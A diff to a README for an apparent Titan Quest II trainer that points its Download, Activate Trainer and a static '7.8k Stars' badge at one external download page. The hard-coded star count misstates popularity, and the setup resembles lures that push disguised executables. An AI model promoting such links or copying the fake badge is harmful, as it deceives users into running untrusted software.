@@ -16,10 +16,10 @@ The trainer is built for players who want to:
 
 It’s a **sandbox toolkit** for both casual fans and hardcore theorycrafters.
 
-[![Download](https://img.shields.io/badge/Download-Now-red?style=for-the-badge\&logo=cloudflare)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 7.8k Stars](https://img.shields.io/badge/GitHub-⭐️%207.8k-orange?style=for-the-badge\&logo=github)](#)
-[![Activate Trainer](https://img.shields.io/badge/Activate%20Trainer-blue?style=for-the-badge\&logo=rocket)](#)
+[![Download](https://img.shields.io/badge/Download-Now-red?style=for-the-badge\&logo=cloudflare)](https://titan-quest-ii-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](https://titan-quest-ii-trainer.github.io/.github/)
+[![⭐️ 7.8k Stars](https://img.shields.io/badge/GitHub-⭐️%207.8k-orange?style=for-the-badge\&logo=github)](https://titan-quest-ii-trainer.github.io/.github/)
+[![Activate Trainer](https://img.shields.io/badge/Activate%20Trainer-blue?style=for-the-badge\&logo=rocket)](https://titan-quest-ii-trainer.github.io/.github/)
 
 ---
 
